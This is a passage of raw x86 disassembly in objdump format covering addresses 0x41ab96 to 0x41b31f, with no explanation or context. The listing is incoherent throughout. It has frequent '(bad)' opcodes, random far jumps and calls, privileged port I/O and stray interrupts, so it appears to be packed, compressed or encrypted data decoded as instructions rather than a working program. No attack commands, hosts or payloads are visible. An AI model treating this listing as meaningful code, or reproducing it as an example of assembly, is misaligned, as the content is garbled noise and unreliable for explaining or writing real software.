  41ab96:	xchg   esp,eax
  41ab97:	(bad)  
  41ab98:	ins    DWORD PTR es:[edi],dx
  41ab99:	cmp    bh,ch
  41ab9b:	gs push edi
  41ab9d:	hlt    
  41ab9e:	mov    al,BYTE PTR [ecx-0x14977299]
  41aba4:	mov    al,al
  41aba6:	xchg   esp,eax
  41aba7:	push   esi
  41aba8:	add    dl,BYTE PTR [ebx-0x78]
  41abab:	sahf   
  41abac:	and    esi,DWORD PTR [edi+0x1c]
  41abaf:	cmc    
  41abb0:	aad    0xaf
  41abb2:	add    eax,0x8102b87e
  41abb7:	dec    edx
  41abb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abb9:	inc    ebp
  41abba:	rcr    bh,cl
  41abbc:	repnz (bad)
  41abbf:	lock int 0x6c
  41abc2:	dec    edi
  41abc3:	aad    0xcb
  41abc5:	sub    eax,0xccfbb564
  41abca:	loop   0x41ab94
  41abcc:	outs   dx,DWORD PTR ds:[esi]
  41abcd:	pop    ecx
  41abce:	jecxz  0x41ab5d
  41abd0:	sbb    BYTE PTR [eax+0x47],0xb3
  41abd4:	neg    BYTE PTR [eax-0x44]
  41abd7:	dec    edx
  41abd8:	outs   dx,DWORD PTR ds:[esi]
  41abd9:	test   BYTE PTR [edx+0x7e],0xae
  41abdd:	sub    eax,0xf14e166
  41abe2:	fcomp  QWORD PTR [ebx]
  41abe4:	pop    ss
  41abe5:	adc    BYTE PTR [eax],ah
  41abe7:	(bad)  
  41abe8:	push   ebx
  41abe9:	inc    eax
  41abea:	sub    BYTE PTR [esi+esi*8+0x58af2c4f],bl
  41abf1:	stc    
  41abf2:	cmp    DWORD PTR [ebp-0x590af4bd],0x63
  41abf9:	aaa    
  41abfa:	or     DWORD PTR ds:0x3200fa3f,edx
  41ac00:	adc    eax,0xb6390000
  41ac05:	and    al,0xe5
  41ac07:	inc    edx
  41ac08:	inc    esp
  41ac09:	mov    ebx,0x70436394
  41ac0e:	cmp    al,0x7a
  41ac10:	(bad)  
  41ac11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac12:	test   DWORD PTR [ecx-0x18],ecx
  41ac15:	std    
  41ac16:	and    edx,DWORD PTR [edi-0x15caf3bf]
  41ac1c:	or     eax,0x581d79c3
  41ac21:	xchg   DWORD PTR [ebx+0x58],edi
  41ac24:	xchg   ecx,eax
  41ac25:	push   ebx
  41ac26:	sar    edx,cl
  41ac28:	pop    edx
  41ac29:	mov    ebp,0x5943930d
  41ac2e:	int3   
  41ac2f:	mov    esp,0x7aca0010
  41ac34:	test   edx,esp
  41ac36:	sub    edi,DWORD PTR [esi+0x4]
  41ac39:	fwait
  41ac3a:	mul    DWORD PTR [esi-0x6880c680]
  41ac40:	xchg   ebx,eax
  41ac41:	mov    ebp,0x20db4104
  41ac46:	(bad)  
  41ac47:	dec    ebp
  41ac48:	enter  0xf63d,0x19
  41ac4c:	sahf   
  41ac4d:	xchg   ebp,eax
  41ac4e:	xor    eax,ebx
  41ac50:	and    dh,BYTE PTR [edx]
  41ac52:	jg     0x41ac44
  41ac54:	push   edx
  41ac55:	pop    esp
  41ac56:	ja     0x41acb9
  41ac58:	adc    bh,BYTE PTR [eax+0x72]
  41ac5b:	and    al,0x2c
  41ac5d:	mov    ds:0x3a80a394,al
  41ac62:	leave  
  41ac63:	test   eax,0xd9b4ca28
  41ac68:	retf   0xd495
  41ac6b:	or     DWORD PTR [ebx*1+0x6a0ac636],ebp
  41ac72:	(bad)  
  41ac73:	ffreep st(5)
  41ac75:	push   ds
  41ac76:	or     esi,esi
  41ac78:	stc    
  41ac79:	loope  0x41acf8
  41ac7b:	or     ebx,DWORD PTR ds:0x17910380
  41ac81:	pop    eax
  41ac82:	jo     0x41ace0
  41ac84:	test   eax,0x2c08dbc0
  41ac89:	out    0x1c,al
  41ac8b:	in     eax,dx
  41ac8c:	xchg   edx,eax
  41ac8d:	call   ebx
  41ac8f:	jo     0x41ac25
  41ac91:	xor    BYTE PTR [ebx],bl
  41ac93:	xabort 0xc5
  41ac96:	mov    bl,0xd4
  41ac98:	or     al,0x1c
  41ac9a:	jmp    0xc54f152b
  41ac9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aca0:	fstp   DWORD PTR [eax]
  41aca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca3:	fisttp QWORD PTR [edx+ebx*2]
  41aca6:	and    bl,BYTE PTR ds:[ebp+0x35]
  41acaa:	push   ebx
  41acab:	adc    bl,BYTE PTR [ebx+0x1f]
  41acae:	mov    dh,0x45
  41acb0:	push   es
  41acb1:	sbb    ch,0x3
  41acb4:	cdq    
  41acb5:	out    dx,al
  41acb6:	jbe    0x41ac85
  41acb8:	mov    WORD PTR [ebp-0x10df7457],?
  41acbe:	fs push edx
  41acc0:	sbb    eax,0xad1276cf
  41acc5:	popa   
  41acc6:	xchg   edx,eax
  41acc7:	iret   
  41acc8:	push   eax
  41acc9:	inc    ecx
  41acca:	sub    eax,0x12aeb280
  41accf:	add    eax,0xa498dab2
  41acd4:	sub    esp,DWORD PTR [eax-0x43a10a4b]
  41acda:	or     dh,cl
  41acdc:	mov    ecx,0x6bc613cd
  41ace1:	dec    esi
  41ace2:	in     al,dx
  41ace3:	int3   
  41ace4:	mov    edx,0xd8479af8
  41ace9:	int3   
  41acea:	cmp    dh,BYTE PTR [edx+0x31d5054c]
  41acf0:	push   esi
  41acf1:	dec    ebp
  41acf2:	inc    edi
  41acf4:	jb     0x41acb1
  41acf6:	push   ebx
  41acf7:	enter  0x8540,0x6e
  41acfb:	call   0x45be:0x5d5d9031
  41ad02:	jmp    0x41ace9
  41ad04:	mov    bl,0xbe
  41ad06:	icebp  
  41ad07:	xchg   DWORD PTR [esi-0x725c84ce],ebp
  41ad0d:	out    0x6f,eax
  41ad0f:	das    
  41ad10:	xlat   BYTE PTR ds:[ebx]
  41ad11:	xlat   BYTE PTR ds:[ebx]
  41ad12:	test   DWORD PTR [ecx+0x31b59076],ecx
  41ad18:	push   esp
  41ad19:	out    0xd0,eax
  41ad1b:	or     DWORD PTR [ebx],edx
  41ad1d:	push   0x7d
  41ad1f:	mov    ecx,DWORD PTR [eax]
  41ad21:	daa    
  41ad22:	shl    DWORD PTR [esi-0x22],cl
  41ad25:	rcr    DWORD PTR [edi+ebp*8-0xd],cl
  41ad29:	in     al,0x3d
  41ad2b:	add    ah,BYTE PTR [eax-0x39a07ce8]
  41ad31:	sbb    ecx,ecx
  41ad33:	jb     0x41ad86
  41ad35:	scas   al,BYTE PTR es:[edi]
  41ad36:	jg     0x41acf8
  41ad38:	jg     0x41ad79
  41ad3a:	retf   
  41ad3b:	fsubr  QWORD PTR [ecx]
  41ad3d:	(bad)  
  41ad3e:	out    dx,eax
  41ad3f:	mov    eax,0x3d0d84b5
  41ad44:	inc    ebp
  41ad45:	dec    esp
  41ad46:	pushf  
  41ad47:	or     al,0xc6
  41ad49:	bound  esp,QWORD PTR [edx+0x22badfbe]
  41ad4f:	jl     0x41ad13
  41ad51:	sbb    bh,bl
  41ad53:	outs   dx,DWORD PTR ds:[esi]
  41ad54:	xor    edx,edx
  41ad56:	sbb    eax,0x37e1a6b
  41ad5b:	jns    0x41ad2b
  41ad5d:	pop    eax
  41ad5e:	cmp    ah,ch
  41ad60:	jmp    0x41ad00
  41ad62:	test   eax,0x83c9bd8b
  41ad67:	dec    ebx
  41ad68:	mov    BYTE PTR [eax+0xd],ah
  41ad6b:	mov    ss,WORD PTR ds:0x5374b073
  41ad71:	xchg   esi,eax
  41ad72:	out    0x32,al
  41ad74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad75:	shl    BYTE PTR [edi-0x778e961b],0xa
  41ad7c:	pop    edx
  41ad7d:	scas   eax,DWORD PTR es:[edi]
  41ad7e:	mov    edi,0xcc81e6a8
  41ad83:	fcomip st,st(4)
  41ad85:	sar    BYTE PTR [edi],1
  41ad87:	cmp    BYTE PTR [edi+0x3b22e37e],cl
  41ad8d:	cwde   
  41ad8e:	jo     0x41ad60
  41ad90:	cli    
  41ad91:	int    0xaa
  41ad93:	mov    eax,ds:0x694fc348
  41ad98:	jecxz  0x41ad68
  41ad9a:	pop    esp
  41ad9b:	in     al,dx
  41ad9c:	sub    eax,0xa5ad31ad
  41ada1:	mov    edi,0xe096cc05
  41ada6:	ja     0x41adcd
  41ada8:	inc    ebp
  41ada9:	xor    eax,0xea618ce4
  41adae:	mov    ch,0x9f
  41adb0:	xchg   esp,eax
  41adb1:	and    al,0x60
  41adb3:	pop    esi
  41adb4:	push   esp
  41adb5:	into   
  41adb6:	jo     0x41ae37
  41adb8:	pusha  
  41adb9:	pop    esi
  41adba:	xor    bl,bl
  41adbc:	(bad)  
  41adbd:	mov    esi,0x53c5adc4
  41adc2:	dec    eax
  41adc3:	dec    esp
  41adc4:	mov    ecx,0x96f73661
  41adc9:	push   ss
  41adca:	lods   eax,DWORD PTR ds:[esi]
  41adcb:	loope  0x41adfc
  41adcd:	push   0x1ece1deb
  41add2:	xor    al,BYTE PTR [edi-0x70]
  41add5:	popf   
  41add6:	xor    edx,ebp
  41add8:	arpl   WORD PTR [ecx+ecx*8+0x562c6320],sp
  41addf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ade0:	cmp    eax,0xd48189c2
  41ade5:	stos   BYTE PTR es:[edi],al
  41ade6:	adc    ch,BYTE PTR [ecx+0x491c6d38]
  41adec:	shl    dh,0xeb
  41adef:	xchg   esp,eax
  41adf0:	sub    DWORD PTR [eax+0x19],0xf63821e7
  41adf7:	fst    QWORD PTR ds:0x86930774
  41adfd:	pop    ebx
  41adfe:	pop    esp
  41adff:	mul    DWORD PTR [eax+0x7f290711]
  41ae05:	sti    
  41ae06:	adc    eax,0x6b7779fa
  41ae0b:	xchg   esp,eax
  41ae0c:	test   al,0x3d
  41ae0e:	sub    cl,ch
  41ae10:	adc    eax,0xfea1567d
  41ae15:	mov    ah,0xd9
  41ae17:	mov    bl,0xf1
  41ae19:	rol    DWORD PTR [esi-0x16e72973],1
  41ae1f:	inc    ebx
  41ae20:	shl    BYTE PTR [ebp-0x40],1
  41ae23:	imul   esp,DWORD PTR [ecx+0x43],0x63
  41ae27:	adc    DWORD PTR [esi],0x51
  41ae2a:	add    BYTE PTR [edi+0x38],ch
  41ae2d:	adc    ebp,DWORD PTR [esp+esi*8]
  41ae30:	mov    esi,0x23e2c67f
  41ae35:	repz add al,BYTE PTR [ebx]
  41ae38:	jae    0x41adf5
  41ae3a:	jg     0x41adf5
  41ae3c:	cmp    al,0xb7
  41ae3e:	xchg   esi,eax
  41ae3f:	and    DWORD PTR ss:[edx],ebx
  41ae42:	push   edi
  41ae43:	inc    DWORD PTR [eax+edi*1]
  41ae46:	aas    
  41ae47:	jge    0x41ae7f
  41ae49:	sub    BYTE PTR [edi],dh
  41ae4b:	hlt    
  41ae4c:	aas    
  41ae4d:	jbe    0x41ae43
  41ae4f:	dec    ecx
  41ae50:	or     eax,0x3bc6856d
  41ae55:	rcl    BYTE PTR [edx],0xef
  41ae58:	mov    eax,0xfe91e4f
  41ae5d:	test   al,0xef
  41ae5f:	fisttp QWORD PTR [edx-0x11]
  41ae62:	mov    edx,0x7c50b57c
  41ae67:	loope  0x41ae8b
  41ae69:	leave  
  41ae6a:	cdq    
  41ae6b:	or     al,0xe3
  41ae6d:	jmp    0x6905:0xe5b57808
  41ae74:	dec    edi
  41ae75:	or     ah,BYTE PTR [ebx+0x27]
  41ae78:	or     eax,0x145830e6
  41ae7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae7e:	sti    
  41ae7f:	into   
  41ae80:	and    bh,dh
  41ae82:	sub    dl,BYTE PTR [eax+0x6]
  41ae85:	imul   edx,DWORD PTR [ebx],0x5c56d6d2
  41ae8b:	fcom   QWORD PTR [edx]
  41ae8d:	add    ah,BYTE PTR [edx+0x35]
  41ae90:	clc    
  41ae91:	jmp    0x88a5c43e
  41ae96:	sub    DWORD PTR [edx],ecx
  41ae98:	mov    ebp,0x39881d54
  41ae9d:	or     DWORD PTR [ecx],edi
  41ae9f:	mov    esi,0x75a38c50
  41aea4:	dec    eax
  41aea5:	repz int3 
  41aea7:	std    
  41aea8:	adc    DWORD PTR [esp+eiz*2],0x7a
  41aeac:	mov    bl,0x7
  41aeae:	sbb    eax,0x77ebb172
  41aeb3:	scas   eax,DWORD PTR es:[edi]
  41aeb4:	out    0x7f,al
  41aeb6:	push   ecx
  41aeb7:	(bad)
  41aebb:	sbb    eax,0x287e0f04
  41aec0:	and    BYTE PTR [ebx*1-0x277aad74],0x3c
  41aec8:	jns    0x41ae8f
  41aeca:	or     bl,BYTE PTR [ebp-0x58]
  41aecd:	ja     0x41ae98
  41aecf:	mov    esi,0xc726be17
  41aed4:	call   0xb4cd2bcc
  41aed9:	ins    BYTE PTR es:[edi],dx
  41aeda:	cld    
  41aedb:	sbb    bl,BYTE PTR [edx-0x3955af14]
  41aee1:	aam    0x3
  41aee3:	stos   BYTE PTR es:[edi],al
  41aee4:	xchg   ebx,eax
  41aee5:	inc    ebx
  41aee6:	pop    edi
  41aee7:	int    0xf7
  41aee9:	lds    esi,FWORD PTR [ebx-0x2]
  41aeec:	das    
  41aeed:	mov    edi,0x647a3386
  41aef2:	xor    ah,bl
  41aef4:	stos   DWORD PTR es:[edi],eax
  41aef5:	jl     0x41af6e
  41aef7:	(bad)  
  41aef8:	push   ebx
  41aef9:	cmp    bh,BYTE PTR es:[edi-0x2dffbb48]
  41af00:	pop    esp
  41af01:	mov    edx,0xf382e6dc
  41af06:	jmp    0xac78:0x550cc515
  41af0d:	xor    DWORD PTR [edi+ecx*2+0x5],edx
  41af11:	lds    ebp,FWORD PTR [ebx]
  41af13:	sub    ecx,ebp
  41af15:	pushf  
  41af16:	mov    al,0x7a
  41af18:	xchg   esp,eax
  41af19:	scas   al,BYTE PTR es:[edi]
  41af1a:	push   edi
  41af1b:	(bad)  
  41af1c:	ret    0x26d8
  41af1f:	jg     0x41aeca
  41af21:	mov    BYTE PTR [eax],bl
  41af23:	dec    ebx
  41af24:	inc    ebx
  41af25:	fbld   TBYTE PTR [edx+0x5280f44e]
  41af2b:	out    dx,al
  41af2c:	pop    ss
  41af2d:	push   es
  41af2e:	rol    eax,1
  41af30:	test   DWORD PTR [ebx-0x7],esi
  41af33:	push   cs
  41af34:	ds pusha 
  41af36:	cmp    BYTE PTR [bp+di],dl
  41af39:	add    eax,0xc42155f7
  41af3e:	sahf   
  41af3f:	cmp    ch,BYTE PTR [ecx]
  41af41:	mov    eax,0x224f6c26
  41af46:	push   es
  41af47:	mov    esp,0x77e0cbc7
  41af4c:	cs jo  0x41af88
  41af4f:	xchg   ebp,eax
  41af50:	test   BYTE PTR [ecx+ecx*2-0x36f63710],al
  41af57:	dec    cx
  41af59:	ins    DWORD PTR es:[edi],dx
  41af5a:	jb     0x41af72
  41af5c:	stos   BYTE PTR es:[edi],al
  41af5d:	test   al,0x39
  41af5f:	into   
  41af60:	in     al,0xdb
  41af62:	pop    es
  41af63:	cs out dx,al
  41af65:	call   0x6ff8f011
  41af6a:	rcr    edx,cl
  41af6c:	push   0xf8ff24eb
  41af71:	push   cs
  41af72:	fisttp QWORD PTR [ebx-0x3ebed9b5]
  41af78:	shl    BYTE PTR [edx+0x29],cl
  41af7b:	test   DWORD PTR [esi+0x5c],ebp
  41af7e:	lods   al,BYTE PTR ds:[esi]
  41af7f:	into   
  41af80:	repz aas 
  41af82:	add    esi,DWORD PTR [edi+ebx*2-0x7d3ae53d]
  41af89:	or     eax,0x75ddfdbd
  41af8e:	mov    dl,bl
  41af90:	xlat   BYTE PTR ds:[ebx]
  41af91:	push   edx
  41af92:	lea    ebx,ds:0xe6c5f883
  41af98:	add    esp,DWORD PTR [edx-0x32d4912]
  41af9e:	inc    ecx
  41af9f:	mov    edx,0x90b40059
  41afa4:	and    DWORD PTR [edi-0x3715e79c],0x17969fd2
  41afae:	(bad)  
  41afaf:	jne    0x41afbd
  41afb1:	push   esp
  41afb2:	or     bh,0xa4
  41afb5:	mov    ah,0x0
  41afb7:	leave  
  41afb8:	or     bh,BYTE PTR [edi+ebp*1-0x3d637f65]
  41afbf:	aas    
  41afc0:	cmp    DWORD PTR [edi-0x7b],edi
  41afc3:	cwde   
  41afc4:	(bad)  
  41afc5:	or     ebp,edx
  41afc7:	mov    ch,0xf1
  41afc9:	scas   al,BYTE PTR es:[edi]
  41afca:	iret   
  41afcb:	shr    BYTE PTR [ebx+eax*2],1
  41afce:	xchg   DWORD PTR [edi-0x5df67ec7],esp
  41afd4:	and    DWORD PTR ds:0x7d162aef,edi
  41afda:	cwde   
  41afdb:	inc    eax
  41afdc:	scas   eax,DWORD PTR es:[edi]
  41afdd:	inc    edi
  41afde:	retf   0x6bd2
  41afe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afe2:	adc    DWORD PTR [ecx],ebp
  41afe4:	sub    BYTE PTR [edx-0x107cf5d5],0xe8
  41afeb:	(bad)  
  41afec:	sub    ebp,edi
  41afee:	jmp    0x6f39:0x5d76304e
  41aff5:	cmp    al,0xab
  41aff7:	sti    
  41aff8:	mov    ebx,0xa491dcf6
  41affd:	mov    dh,0x8b
  41afff:	mov    bh,0xd2
  41b001:	cmp    bh,cl
  41b003:	pop    edi
  41b004:	cmp    DWORD PTR [edi],eax
  41b006:	xchg   ebp,eax
  41b007:	je     0x41b083
  41b009:	push   ecx
  41b00a:	aad    0xfd
  41b00c:	out    dx,eax
  41b00d:	xor    al,0x5e
  41b00f:	cmp    ecx,DWORD PTR [esi+0x75]
  41b012:	or     BYTE PTR ss:[edx-0x51],bl
  41b016:	into   
  41b017:	adc    al,0x7
  41b019:	push   edx
  41b01a:	xor    BYTE PTR [edi],ch
  41b01c:	mov    ebp,0xa62c7ded
  41b021:	adc    ecx,DWORD PTR [esi]
  41b023:	dec    DWORD PTR [ecx]
  41b025:	or     BYTE PTR [edi-0x5a75c26f],0xf
  41b02c:	dec    ebx
  41b02d:	pop    edx
  41b02e:	sub    dh,BYTE PTR [ebp+ecx*8+0x3a]
  41b032:	fisubr WORD PTR [eax]
  41b034:	xchg   esi,eax
  41b035:	cmc    
  41b036:	xor    BYTE PTR [esi],0x1e
  41b039:	ins    BYTE PTR es:[edi],dx
  41b03a:	inc    eax
  41b03b:	cmp    ah,ch
  41b03d:	mov    dl,0xcf
  41b03f:	lods   eax,DWORD PTR ds:[esi]
  41b040:	mov    esp,0x77c10fb8
  41b045:	stos   BYTE PTR es:[edi],al
  41b046:	leave  
  41b047:	cmp    eax,0x7ff16272
  41b04c:	and    ebp,DWORD PTR [esi-0x9766003]
  41b052:	mov    ebx,0xa1e8ce86
  41b057:	loopne 0x41b042
  41b059:	mov    ecx,0x20e259d9
  41b05e:	jecxz  0x41b030
  41b060:	dec    ebx
  41b061:	cwde   
  41b062:	loope  0x41b03a
  41b064:	mov    cl,0xde
  41b066:	sub    al,0x2a
  41b068:	addr16 test eax,0xb6b0d11d
  41b06e:	out    0xb0,eax
  41b070:	(bad)  
  41b071:	test   BYTE PTR [ebp+0x664eb882],dl
  41b077:	je     0x41affc
  41b079:	inc    ebp
  41b07a:	or     eax,0x18d5658d
  41b07f:	sbb    al,0x1c
  41b081:	cmp    eax,0xb5a76873
  41b086:	pushf  
  41b087:	enter  0xcfe,0x5e
  41b08b:	(bad)  
  41b08c:	push   ebx
  41b08d:	and    BYTE PTR [ecx-0x79],al
  41b090:	pop    esi
  41b091:	aam    0x35
  41b093:	pop    ds
  41b094:	xor    al,0xb5
  41b096:	into   
  41b097:	je     0x41b07c
  41b099:	shr    bh,cl
  41b09b:	xchg   ebx,eax
  41b09c:	push   eax
  41b09d:	mov    dh,0x1e
  41b09f:	(bad)  [edi-0x3dbc3c85]
  41b0a5:	mov    ah,0x7e
  41b0a7:	or     BYTE PTR [ebx],ch
  41b0a9:	or     BYTE PTR [ecx-0xf],dl
  41b0ac:	mov    ah,0xd1
  41b0ae:	in     al,0xfa
  41b0b0:	or     BYTE PTR [ebx-0x3c],ah
  41b0b3:	sbb    BYTE PTR [edx+0x32],0x42
  41b0b7:	call   0x308d:0x5af6139f
  41b0be:	mov    eax,ds:0x54302955
  41b0c3:	xor    DWORD PTR [eax+0x5e7b56b3],0xffffffe6
  41b0ca:	jge    0x41b07b
  41b0cc:	js     0x41b08d
  41b0ce:	adc    BYTE PTR [edx+0x32],dh
  41b0d1:	cmp    DWORD PTR [esi-0x2d],edx
  41b0d4:	jmp    0x508120f6
  41b0d9:	aam    0xee
  41b0db:	das    
  41b0dc:	inc    esi
  41b0dd:	jp     0x41b089
  41b0df:	retf   
  41b0e0:	xlat   BYTE PTR ds:[ebx]
  41b0e1:	jb     0x41b0b0
  41b0e3:	ror    BYTE PTR [ecx-0x4e],cl
  41b0e6:	add    DWORD PTR [ebp+0x4],ebx
  41b0e9:	hlt    
  41b0ea:	xchg   esp,eax
  41b0eb:	mov    ah,BYTE PTR ds:0xb8ef8f39
  41b0f1:	pop    ebp
  41b0f2:	cwde   
  41b0f3:	imul   edi,DWORD PTR [eax-0x33781bce],0xffffffc0
  41b0fa:	adc    ebx,DWORD PTR es:[ebp-0x64dd464b]
  41b101:	out    dx,al
  41b102:	sbb    dh,BYTE PTR [ebx+0xe]
  41b105:	pop    dx
  41b107:	cmp    edi,esi
  41b109:	mov    ds:0x8842e86f,eax
  41b10e:	sahf   
  41b10f:	sub    al,ch
  41b111:	stos   BYTE PTR es:[edi],al
  41b112:	fsubr  st(2),st
  41b114:	frstpm(287 only) 
  41b116:	daa    
  41b117:	sar    DWORD PTR [ebx-0x69ffc94c],0xc9
  41b11e:	in     eax,0xa3
  41b120:	xchg   ebp,eax
  41b121:	mov    edx,0x3581654e
  41b126:	jmp    0x41b0fe
  41b128:	imul   eax,DWORD PTR [edi+0x1e],0x25
  41b12c:	daa    
  41b12d:	cdq    
  41b12e:	push   ss
  41b12f:	add    eax,0xb3705d3e
  41b134:	call   0x10d2:0xe97a176b
  41b13b:	push   ds
  41b13c:	push   ebp
  41b13d:	jnp    0x41b1b9
  41b13f:	xchg   esi,eax
  41b140:	sti    
  41b141:	jmp    0xb812:0xe80e740a
  41b148:	inc    edi
  41b149:	rcl    al,0xf
  41b14c:	je     0x41b19d
  41b14e:	lods   eax,DWORD PTR ds:[esi]
  41b14f:	repnz add DWORD PTR [ebp+edx*2-0x5e],ebp
  41b154:	inc    esi
  41b155:	int    0x76
  41b157:	neg    dh
  41b159:	mov    esp,0xbd9bcfdf
  41b15e:	add    eax,0x7a3e4695
  41b163:	xchg   ebx,eax
  41b164:	lea    eax,[ecx+0x70]
  41b167:	jmp    0x73d1:0xe790abe8
  41b16e:	inc    ebp
  41b16f:	jae    0x41b1b8
  41b171:	ret    
  41b172:	adc    ebp,DWORD PTR [ecx+0x49]
  41b175:	outs   dx,BYTE PTR ds:[esi]
  41b176:	xor    ah,BYTE PTR [eax]
  41b178:	pop    edi
  41b179:	jnp    0x41b19d
  41b17b:	inc    esi
  41b17c:	dec    ebp
  41b17d:	cmp    dl,bl
  41b17f:	inc    ebx
  41b180:	shl    bh,0xb1
  41b183:	es jl  0x41b1d0
  41b186:	arpl   WORD PTR [ebx],si
  41b188:	mov    WORD PTR [ebp+0x11c62a20],cs
  41b18e:	bound  esi,QWORD PTR [eax+0x71b8f84]
  41b194:	jne    0x41b214
  41b196:	or     DWORD PTR [ecx+0x52],eax
  41b199:	repz dec esi
  41b19b:	rcl    DWORD PTR [ecx],cl
  41b19d:	jns    0x41b13a
  41b19f:	mov    dl,0xfb
  41b1a1:	or     al,bl
  41b1a3:	add    BYTE PTR [edx],ch
  41b1a5:	loopne 0x41b1cd
  41b1a7:	sti    
  41b1a8:	dec    ebp
  41b1a9:	daa    
  41b1aa:	ror    ch,cl
  41b1ac:	test   edi,ebp
  41b1ae:	call   0x8ba6:0x26e662ff
  41b1b5:	adc    esi,edx
  41b1b7:	(bad)  
  41b1b8:	push   cs
  41b1b9:	sub    al,bh
  41b1bb:	scas   eax,DWORD PTR es:[edi]
  41b1bc:	pop    ds
  41b1bd:	mov    edx,DWORD PTR [ecx]
  41b1bf:	cmp    al,0x2a
  41b1c1:	(bad)  
  41b1c2:	mov    eax,0x543a2e32
  41b1c7:	push   cs
  41b1c8:	ins    BYTE PTR es:[edi],dx
  41b1c9:	jb     0x41b1a6
  41b1cb:	inc    esp
  41b1cc:	add    eax,0x41877a8d
  41b1d1:	aam    0x89
  41b1d3:	pop    ds
  41b1d4:	lock fcmovne st,st(1)
  41b1d7:	sub    ecx,DWORD PTR [ecx+0x35]
  41b1da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1db:	sahf   
  41b1dc:	cli    
  41b1dd:	es pop esp
  41b1df:	fcom   st(7)
  41b1e1:	call   ebx
  41b1e3:	mov    al,0xc8
  41b1e5:	push   ds
  41b1e6:	rcr    bl,1
  41b1e8:	inc    ecx
  41b1e9:	sbb    eax,0xa3b10197
  41b1ee:	test   DWORD PTR [ebx+0x412c34ac],ebp
  41b1f4:	mov    edx,0x311e0a97
  41b1f9:	add    eax,edi
  41b1fb:	out    0x38,eax
  41b1fd:	dec    esp
  41b1fe:	fsubr  DWORD PTR [esi-0x22ae24f9]
  41b204:	mov    cl,BYTE PTR [esi]
  41b206:	xchg   edi,eax
  41b207:	jmp    0x883e:0x456a5300
  41b20e:	pop    ds
  41b20f:	loop   0x41b289
  41b211:	fstp   QWORD PTR ds:0x42a12802
  41b217:	pop    ds
  41b218:	lds    edx,FWORD PTR [esi]
  41b21a:	sbb    al,0x10
  41b21c:	push   ebp
  41b21d:	fimul  WORD PTR [ebp-0x377a347]
  41b223:	or     DWORD PTR [edi-0x361b9ab9],eax
  41b229:	sbb    al,0x96
  41b22b:	bt     DWORD PTR [ecx+eiz*2-0x5f],0x26
  41b231:	lock call 0x73a6:0x4e811fe4
  41b239:	cli    
  41b23a:	mov    eax,0xaec1ebd4
  41b23f:	pop    edx
  41b240:	dec    esi
  41b241:	mov    DWORD PTR [edx+ecx*1+0x5e40fb49],ecx
  41b248:	(bad)  
  41b249:	das    
  41b24a:	xor    DWORD PTR [ebp-0x78],0xffffffc4
  41b24e:	adc    DWORD PTR [edi],ebp
  41b250:	leave  
  41b251:	inc    ebx
  41b252:	popf   
  41b253:	dec    ebx
  41b254:	mov    esi,0x58b156f5
  41b259:	call   0x32a89d11
  41b25e:	clc    
  41b25f:	dec    ecx
  41b260:	inc    edi
  41b261:	mov    ebx,0xbe346d24
  41b266:	mov    WORD PTR [esp+edi*1-0x4e44715b],ss
  41b26d:	cmp    esp,esp
  41b26f:	test   eax,0xc801c879
  41b274:	stc    
  41b275:	jle    0x41b271
  41b277:	jns    0x41b25d
  41b279:	neg    BYTE PTR [esi]
  41b27b:	mov    dl,0x34
  41b27d:	test   al,0x7f
  41b27f:	xchg   ecx,eax
  41b280:	ds pop es
  41b282:	add    ebp,DWORD PTR [ebx+0x1f]
  41b285:	push   ecx
  41b286:	bound  eax,QWORD PTR [edi+eiz*4]
  41b289:	and    esi,ebp
  41b28b:	fld    TBYTE PTR [edx-0x7]
  41b28e:	in     al,dx
  41b28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b290:	cdq    
  41b291:	mov    edi,0xeaaff28b
  41b296:	ins    BYTE PTR es:[edi],dx
  41b297:	push   ecx
  41b298:	or     esi,esp
  41b29a:	push   edi
  41b29b:	ret    
  41b29c:	xchg   edx,eax
  41b29d:	inc    eax
  41b29e:	adc    ch,BYTE PTR [esi+0x34]
  41b2a1:	sbb    cl,BYTE PTR [esi+0x0]
  41b2a4:	pop    esi
  41b2a5:	aaa    
  41b2a6:	and    dl,BYTE PTR [edi+0x6fb39a9f]
  41b2ac:	mov    ds:0x7b74f9b6,al
  41b2b1:	adc    BYTE PTR [eax-0x4df1a079],0x15
  41b2b8:	sub    al,0x7e
  41b2ba:	sub    al,0x89
  41b2bc:	xor    al,0x99
  41b2be:	idiv   DWORD PTR [esi-0x4d6f46ff]
  41b2c4:	call   DWORD PTR [edi-0x59]
  41b2c7:	dec    esi
  41b2c8:	ds dec esp
  41b2ca:	jae    0x41b2ef
  41b2cc:	xchg   esp,eax
  41b2cd:	sbb    eax,0x2f264bd9
  41b2d2:	or     dh,0x20
  41b2d5:	loope  0x41b268
  41b2d7:	xlat   BYTE PTR ds:[ebx]
  41b2d8:	popa   
  41b2d9:	add    eax,0x67a9051f
  41b2de:	xchg   ebx,eax
  41b2df:	jbe    0x41b302
  41b2e1:	sahf   
  41b2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e3:	sbb    al,0x1b
  41b2e5:	lahf   
  41b2e6:	cmp    eax,0x23a4d3f1
  41b2eb:	lock in al,0xcf
  41b2ee:	jl     0x41b270
  41b2f0:	hlt    
  41b2f1:	inc    esp
  41b2f2:	loopne 0x41b307
  41b2f4:	inc    esp
  41b2f5:	lds    eax,FWORD PTR [esi-0x7a]
  41b2f8:	jns    0x41b358
  41b2fa:	or     eax,0x80ad21ed
  41b2ff:	retf   0xad2a
  41b302:	bound  esi,QWORD PTR [edi+0xd]
  41b305:	fdivr  QWORD PTR [eax]
  41b307:	sbb    al,ah
  41b309:	stos   DWORD PTR es:[edi],eax
  41b30a:	ret    
  41b30b:	ror    BYTE PTR [ecx+edx*2-0x1f2fd8d4],1
  41b312:	add    bh,BYTE PTR [ebp+0x24]
  41b315:	int    0xd4
  41b317:	ins    BYTE PTR es:[edi],dx
  41b318:	mov    edi,0xb2a3440d
  41b31d:	add    al,ah
  41b31f:	ins    DWORD PTR es:[edi],dx
